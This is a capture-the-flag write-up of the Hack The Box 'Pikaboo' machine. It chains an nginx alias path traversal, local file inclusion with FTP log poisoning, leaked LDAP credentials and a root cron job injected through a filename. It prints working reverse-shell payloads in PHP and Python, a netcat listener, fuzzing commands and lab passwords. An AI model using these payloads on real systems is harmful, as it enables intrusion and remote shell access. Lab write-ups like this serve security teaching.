# Pikaboo

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.10.249 |
| **Status** | Retired |

## Overview
Pikaboo is a Hard Linux box hosting a Pokemon-themed site (pikaboo.htb) behind an nginx reverse proxy that forwards to an Apache backend on port 81. A misconfigured nginx `alias` directive allows path traversal into a hidden staging application, which exposes a Local File Inclusion (LFI) vulnerability. Chaining the LFI with FTP log poisoning yields a foothold as `pwnmeow`. From there, LDAP credentials recovered from a PokeAPI Django config lead to a root-owned cron job (`csvupdate_cron`) that can be abused via a malicious CSV/FTP filename to execute arbitrary commands as root.

## Reconnaissance
Nmap showed three services: FTP (vsftpd 3.0.3), SSH (OpenSSH 7.9p1 on Debian 10), and HTTP (nginx 1.14.2) advertising the `Pikaboo` site.

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    nginx 1.14.2
```

The nginx server proxies to `127.0.0.1:81`, which runs Apache/2.4.38 (Debian). This dual web-server setup (nginx front end + Apache back end) turned out to be the key to the initial foothold.

## Enumeration
Requesting `/admin../server-status` revealed that nginx's alias-based path traversal misconfiguration (see [Acunetix advisory](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)) could be used to break out of the `/admin/` alias and reach a separate `admin_staging` application:

```
http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

The `page` parameter in `admin_staging/index.php` was vulnerable to LFI. Fuzzing with ffuf and the LFI-Jhaddix wordlist confirmed several readable log files, most usefully `/var/log/vsftpd.log`:

```
ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ \
     -w LFI-Jhaddix.txt -c -fs 15349
```

## Foothold
Because `vsftpd` writes failed login attempts (including the attempted username) to `/var/log/vsftpd.log`, the log could be poisoned by attempting an FTP login using a PHP payload as the username:

```php
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.11/1338 0>&1'"); ?>
```

After a listener was started with `nc -lvnp 1338`, requesting the poisoned log via the LFI parameter (`page=/var/log/vsftpd.log`) executed the injected PHP code, giving a reverse shell as `www-data`.

## Privilege Escalation
Enumeration of `/opt/pokeapi` (a Django-based PokeAPI instance) revealed hard-coded PostgreSQL and, more importantly, LDAP bind credentials in `config/settings.py`:

```
cn=binduser,ou=users,dc=pikaboo,dc=htb : J~42%W?PFHl]g
```

Querying LDAP with these credentials disclosed a base64-encoded password hash for `pwnmeow`:

```
ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' \
           -b "dc=pikaboo,dc=htb" -h 127.0.0.1 -p 389
```

Decoding `userPassword` gave the plaintext `pwnmeow:_G0tT4_C4tcH_'3m_4lL!_`, confirming/aligning with the `pwnmeow` shell user. Running linPEAS from this shell identified a root-owned cron job, `/usr/local/bin/csvupdate_cron`, which processes CSV files uploaded via FTP. By uploading a file whose *name* itself is a Python reverse-shell one-liner (with a `.csv` extension), the cron job executed the filename as a shell command when it ran:

```
touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.11\",1332));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv"
```

The malicious filename was uploaded over FTP as `pwnmeow`, and once the cron job triggered, a root shell was received on the listening port.

## Lessons Learned
- Reverse-proxy path-traversal misconfigurations in nginx `alias` directives can expose entirely separate, unintended applications.
- FTP/HTTP log files are a classic LFI-to-RCE pivot when an attacker can control log content (log poisoning).
- Hard-coded service credentials in application config files (Django `settings.py`) frequently unlock lateral movement (here, LDAP).
- Cron jobs that process attacker-influenced filenames (rather than file contents) are an easily overlooked command-injection vector.

## Tools & References
- ffuf, linPEAS, ldapsearch, netcat
- [Acunetix: Path Traversal via Misconfigured Nginx Alias](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)
- No large binaries or loot were present in the original archive for this machine; only `nmap/` output and free-text `notes` existed, which have been merged into this writeup.
